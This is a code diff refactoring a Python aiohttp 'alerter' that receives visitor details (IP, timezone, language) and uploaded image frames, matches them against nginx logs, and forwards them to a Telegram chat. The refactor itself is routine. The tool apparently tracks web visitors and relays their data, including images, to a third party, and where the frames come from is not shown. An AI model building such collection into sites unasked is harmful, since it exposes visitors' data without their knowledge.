@@ -1,4 +1,6 @@
 import asyncio
+from dataclasses import dataclass
+from functools import partial
 import json
 import sys
 from contextlib import suppress
@@ -9,33 +11,47 @@ from environs import Env
 from telethon import TelegramClient
 
 
-env = Env()
-env.read_env()
+@dataclass(slots=True)
+class Logger:
+    api_id: int
+    api_hash: str
+    bot_token: str
+    chat_id: str
 
-TG_API_ID = env.int("TG_API_ID")
-TG_API_HASH = env.str("TG_API_HASH")
-TG_BOT_TOKEN = env.str("TG_BOT_TOKEN")
-TG_CHAT_ID = env.str("TG_CHAT_ID")
+    client: TelegramClient | None = None
+
+    def __post_init__(self) -> None:
+        self.client = TelegramClient(
+            "alerter",
+            self.api_id,
+            self.api_hash,
+        ).start(bot_token=self.bot_token)
+
+    async def notify(self, text: str, image: Path | None = None) -> None:
+        print(text)
+        print()
+
+        if image:
+            await self.client.send_file(self.chat_id, image, caption=text)
+        else:
+            await self.client.send_message(self.chat_id, text)
 
 
-tg = TelegramClient(
-    "alerter",
-    TG_API_ID,
-    TG_API_HASH,
-).start(bot_token=TG_BOT_TOKEN)
-
-
-async def notify(text: str, image: Path | None = None) -> None:
-    if image:
-        await tg.send_file(TG_CHAT_ID, image, caption=text)
-    else:
-        await tg.send_message(TG_CHAT_ID, text)
+def build_logger() -> Logger:
+    env = Env()
+    env.read_env()
+    return Logger(
+        api_id=env.int("TG_API_ID"),
+        api_hash=env.str("TG_API_HASH"),
+        bot_token=env.str("TG_BOT_TOKEN"),
+        chat_id=env.str("TG_CHAT_ID"),
+    )
 
 
 client_context: dict[str, dict] = {}
 
 
-async def handle_context(request: web.Request) -> web.Response:
+async def handle_context(request: web.Request, logger: Logger) -> web.Response:
     with suppress(Exception):
         payload = await request.json()
         client_context[request.remote] = payload
@@ -49,13 +65,12 @@ async def handle_context(request: web.Request) -> web.Response:
             f"Lang: {payload.get('language')}"
         )
 
-        print(msg)
-        await notify(msg)
+        await logger.notify(msg)
 
     return web.Response(status=204)
 
 
-async def handle_frame(request: web.Request) -> web.Response:
+async def handle_frame(request: web.Request, logger: Logger) -> web.Response:
     reader = await request.multipart()
     field = await reader.next()
 
@@ -69,12 +84,12 @@ async def handle_frame(request: web.Request) -> web.Response:
 
     msg = "📸 Frame received"
     print(msg)
-    await notify(msg, image=path)
+    await logger.notify(msg, image=path)
 
     return web.Response(status=204)
 
 
-async def read_stdin() -> None:
+async def read_stdin(logger: Logger) -> None:
     loop = asyncio.get_running_loop()
     reader = asyncio.StreamReader()
     await loop.connect_read_pipe(
@@ -88,10 +103,10 @@ async def read_stdin() -> None:
             continue
 
         with suppress(json.JSONDecodeError):
-            await handle_log(json.loads(line))
+            await handle_log(json.loads(line), logger)
 
 
-async def handle_log(log: dict) -> None:
+async def handle_log(log: dict, logger: Logger) -> None:
     ip = log.get("ip")
     ctx = client_context.pop(ip, None)
 
@@ -110,26 +125,23 @@ async def handle_log(log: dict) -> None:
             f"TZ: {ctx.get('timezone')}\n"
             f"Lang: {ctx.get('language')}"
         )
-
-    print(msg)
-    await notify(msg)
-    print()
+    await logger.notify(msg)
 
 
 async def main() -> None:
+    logger = build_logger()
     print("starting the alerter")
     print("🟢 waiting for nginx logs...\n")
-
     app = web.Application()
-    app.router.add_post("/_context", handle_context)
-    app.router.add_post("/_frame", handle_frame)
+    app.router.add_post("/_context", partial(handle_context, logger=logger))
+    app.router.add_post("/_frame", partial(handle_frame, logger=logger))
 
     runner = web.AppRunner(app)
     await runner.setup()
     await web.TCPSite(runner, "127.0.0.1", 3001).start()
 
     print("🟢 listening on 127.0.0.1:3001\n")
-    await read_stdin()
+    await read_stdin(logger)
 
 
 if __name__ == "__main__":
